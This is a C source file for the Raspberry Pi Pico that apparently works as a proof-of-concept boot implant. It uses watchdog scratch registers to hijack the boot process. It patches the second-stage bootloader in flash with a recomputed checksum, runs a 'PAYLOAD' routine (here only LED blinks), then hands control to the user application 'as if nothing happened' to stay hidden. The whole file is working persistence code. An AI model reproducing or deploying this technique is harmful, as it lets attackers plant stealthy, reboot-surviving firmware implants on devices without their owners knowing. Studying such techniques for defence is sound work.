#include <stdio.h>
#include "pico/stdlib.h"
#include "hardware/gpio.h"
#include "hardware/flash.h"
#include "hardware/watchdog.h"
#include "bootrom/bootrom_crc32.h"
#include <stdlib.h>
#include <string.h>
#include <hardware/sync.h>
#include "hardware/structs/sio.h"
#define BOOT2_SIZE_BYTES 256
#define SECTOR_SIZE 4096
#define BOOT2_FLASH_OFFS 0
#define BOOT2_MAGIC 0x12345678
#define BOOT2_BASE 0x20004000
static uint8_t* const boot2_load = (uint8_t* const)BOOT2_BASE;

#define BOOT3_VTOR 0x10ff0000


#define BOOTROM_FLASH_PTR 0x2523
#define BOOTROM_MAIN_PTR 0xeb

#define VTOR_PTR 0x10000100

#define WD_SR_4 0x4005801c
#define WD_SR_5 0x40058020
#define WD_SR_6 0x40058024
#define WD_SR_7 0x40058028
#define WD_MAGIC_NUMBER 0xb007c0d3
#define N_WD_MAGIC_NUMBER 0x4ff83f2d
#define ENTRY_PTR BOOTROM_FLASH_PTR
#define SP_WD 0x20041000
#define WD_LOADED() (*((volatile uint32_t*)WD_SR_4)==WD_MAGIC_NUMBER)

#define ROSC_MHZ_MAX 12



static inline void delay(uint32_t count) {
    asm volatile (
        "1: \n\t"
        "sub %0, %0, #1 \n\t"
        "bne 1b"
        : "+r" (count)
        );
}

static inline void WD_SET_SR() {
    *((volatile uint32_t*)WD_SR_4) = WD_MAGIC_NUMBER;
    *((volatile uint32_t*)WD_SR_5) = (N_WD_MAGIC_NUMBER) ^ ENTRY_PTR;
    *((volatile uint32_t*)WD_SR_6) = SP_WD;
    *((volatile uint32_t*)WD_SR_7) = ENTRY_PTR;
}

static inline void inject_return(uint8_t* BUFFER) {
    *(uint32_t*)(BUFFER + 0xe8) = BOOT3_VTOR;
    // Recalc check sum @ BOOT2_PTR+252, then stick it back in (RAW-DAWGin it)
    uint32_t new_checksum = crc32_small((void*)BUFFER, BOOT2_SIZE_BYTES - 4, 0xFFFFFFFF);
    *(volatile uint32_t*)((uint8_t*)BUFFER + BOOT2_SIZE_BYTES - 4) = new_checksum;
}


static void watchdogHandler(){
    //Reset WD Scratch
    WD_SET_SR();

    uint32_t sum = 0;
    for (int i = 0; i < 9; ++i) {
        delay(1 * ROSC_MHZ_MAX / 3);
        sum += (sio_hw->gpio_hi_in >> 1) & 1u;
    }
    if (sum >= 5)
        return;
    //Check if Boot2 needs to be modified
    memcpy((uint8_t*)boot2_load, (uint8_t*)0x10000000, BOOT2_SIZE_BYTES);

    if (*((uint32_t*)(boot2_load+0xe8)) != BOOT3_VTOR) {
        gpio_put(25, 0);
        sleep_ms(100);
        gpio_put(25, 1);
        sleep_ms(100);

        

        inject_return(boot2_load);
        //write block back
        uint32_t* sector_buffer = malloc(4096);
        for (int i = 0; i < 256 / 4; i++) {
            sector_buffer[i] = boot2_load[i];
        }
        memcpy((uint8_t*)VTOR_PTR, (uint8_t*)(sector_buffer + (256 / 4)), 4096 - 256);
        uint32_t ints = save_and_disable_interrupts();
        flash_range_erase(0, 4096);
        flash_range_program(BOOT2_FLASH_OFFS, (uint8_t*)sector_buffer, 4096);
        restore_interrupts(ints);
        free(sector_buffer);
    }
    asm volatile(
        "msr msp, %0\n\t"
        "bx %1"
        :
        : "r"(0x20041f00), "r"(BOOTROM_MAIN_PTR)
        :
        );
}
static inline void PAYLOAD() {
    gpio_put(25, 0);
    sleep_ms(800);
    gpio_put(25, 1);
    sleep_ms(200);

    gpio_put(25, 0);
    sleep_ms(800);
    gpio_put(25, 1);
    sleep_ms(200);
    
}

int main(){
    stdio_init_all();
    gpio_init(25);
    gpio_set_dir(25, GPIO_OUT);
    gpio_put(25, 1);
    if (!WD_LOADED()) {
        watchdogHandler();
    }
    //Payload execution
    PAYLOAD();

    //Run user application as if nothing happened
    uint32_t MSP = *(volatile uint32_t*)VTOR_PTR;
    uint32_t MAIN = *(((volatile uint32_t*)VTOR_PTR) + 1);
    *((volatile uint32_t*)(PPB_BASE + M0PLUS_VTOR_OFFSET)) = VTOR_PTR;
    asm volatile(
      "msr msp, %0\n\t"
      "bx %1"
      :
      : "r"(MSP), "r"(MAIN)
      : "memory"
   );
}